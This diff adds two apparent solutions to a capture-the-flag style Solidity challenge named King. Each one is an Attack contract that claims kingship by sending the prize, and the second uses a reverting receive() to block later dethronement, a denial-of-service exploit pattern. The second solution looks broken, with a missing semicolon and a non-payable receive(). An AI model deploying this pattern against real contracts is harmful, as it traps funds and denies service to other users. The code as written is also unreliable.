@@ -24,3 +24,32 @@ contract King {
     return king;
   }
 }
+
+
+// SOL 1
+// the whole sol is just to make sure nobody can send txn after you are king
+
+contract Attack{
+  constructor(address _addr) payable{
+    King king = King(payable(_addr));
+    uint256 prize = king.prize();
+    (bool success,) = address(king).call{value:prize}("");
+    require(success, "Txn failed, Try again");
+  }
+}
+
+// SOL 2
+// hence, dont define a fallback fucntion and if you define one, just add a revert() so it reverts all payment
+// with this revert func, you might be experiencing JSONRPC error on Remix IDE
+
+contract Attack{
+  constructor(address _addr) payable{
+    King king = King(payable(_addr));
+    uint256 prize = king.prize();
+    (bool success,) = address(king).call{value:prize}("");
+    require(success, "Txn failed, Try again");
+  }
+
+receive() external {
+revert("I am the only king, you cant dethrone me!")
+}
